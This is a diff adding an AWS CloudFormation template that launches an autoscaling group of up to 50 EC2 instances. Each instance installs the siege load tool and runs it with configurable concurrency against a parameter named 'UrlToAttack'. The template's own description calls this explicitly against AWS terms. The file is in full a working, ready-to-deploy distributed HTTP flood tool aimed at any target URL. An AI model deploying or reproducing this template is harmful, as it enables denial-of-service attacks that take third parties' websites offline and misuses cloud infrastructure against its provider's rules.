@@ -1,0 +1,95 @@
+{
+    "AWSTemplateFormatVersion": "2010-09-09",
+
+    "Description": "Boots a bunch of servers that send lots of HTTP requests to a url. This is EXPLICITLY againt the AWS TOS",
+
+    "Parameters": {
+        "InstanceType": {
+            "Description": "WebServer EC2 instance type",
+            "Type": "String",
+            "Default": "t1.micro",
+            "AllowedValues": [ "t1.micro", "m1.small", "m1.medium", "m1.large", "m1.xlarge", "m2.xlarge", "m2.2xlarge", "m2.4xlarge", "m3.xlarge", "m3.2xlarge", "c1.medium", "c1.xlarge", "cc1.4xlarge", "cc2.8xlarge", "cg1.4xlarge"],
+            "ConstraintDescription": "must be a valid EC2 instance type."
+        },
+        "KeyName": {
+            "Description": "Name of an existing EC2 KeyPair to enable SSH access to the instances",
+            "Type": "String"
+        },
+        "SecurityGroup": {
+            "Description": "Name of an existing Security Group",
+            "Type": "String"
+        },
+        "AmiImageId": {
+            "Description": "The AMI to boot, defaults to Ubuntu Server 13.10",
+            "Type": "String",
+            "Default": "ami-35dbde5c"
+        },
+        "UrlToAttack": {
+            "Description": "The URL to attack",
+            "Type": "String"
+        },
+        "AttackServerCount": {
+            "Description": "The number of servers to launch",
+            "Type": "Number",
+            "Default": 1
+        },
+        "ConcurrencyPerServer": {
+            "Description": "The number of threads to query with",
+            "Type": "Number",
+            "Default": 50
+        }
+    },
+
+    "Resources": {
+        "AutoScalingWebDev": {
+            "Type": "AWS::AutoScaling::AutoScalingGroup",
+            "Properties": {
+                "AvailabilityZones": {
+                    "Fn::GetAZs": ""
+                },
+                "LaunchConfigurationName": {
+                    "Ref": "LaunchConfig"
+                },
+                "DesiredCapacity": {"Ref": "AttackServerCount"},
+                "MinSize": "1",
+                "MaxSize": "50"
+            },
+            "UpdatePolicy": {
+                "AutoScalingRollingUpdate": {
+                    "MinInstancesInService": "1",
+                    "MaxBatchSize": "1",
+                    "PauseTime": "PT1M30S"
+                }
+            }
+        },
+
+        "LaunchConfig": {
+            "Type": "AWS::AutoScaling::LaunchConfiguration",
+            "Properties": {
+                "KeyName": {
+                    "Ref": "KeyName"
+                },
+                "ImageId": {
+                    "Ref": "AmiImageId"
+                },
+                "UserData": {
+                    "Fn::Base64": {
+                        "Fn::Join": ["", [
+                            "#!/bin/sh -ex\n",
+                            "sudo apt-get install siege\n",
+                            "siege -c ", {"Ref": "ConcurrencyPerServer"}, " ", {"Ref": "UrlToAttack"} , "\n"
+                        ]]
+                    }
+                },
+                "SecurityGroups": [
+                    {
+                        "Ref": "SecurityGroup"
+                    }
+                ],
+                "InstanceType": {
+                    "Ref": "InstanceType"
+                }
+            }
+        }
+    }
+}
